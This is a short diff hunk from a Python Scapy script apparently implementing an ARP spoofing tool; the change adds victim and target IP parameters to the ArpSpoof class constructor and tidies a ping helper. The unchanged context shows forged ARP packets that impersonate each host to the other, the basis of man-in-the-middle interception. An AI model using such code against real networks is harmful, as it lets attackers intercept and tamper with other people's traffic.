@@ -28,11 +28,13 @@ class ArpSpoof(threading.Thread):
             Ether() / ARP(op="who-has", hwsrc=self.host_mac, psrc=self.tIP, pdst=self.vIP),
             Ether() / ARP(op="who-has", hwsrc=self.host_mac, psrc=self.vIP, pdst=self.tIP)])
 
-    def __init__(self):
+    def __init__(self, vIP, tIP):
+        self.vIP = vIP
+        self.tIP = tIP
         threading.Thread.__init__(self)
 
     def fill_arp(self):
-        sr1(IP(dst=str(self.tIP)) /ICMP())
+        sr1(IP(dst=str(self.tIP)) / ICMP())
         sr1(IP(dst=str(self.vIP)) / ICMP())
 
     def run(self):
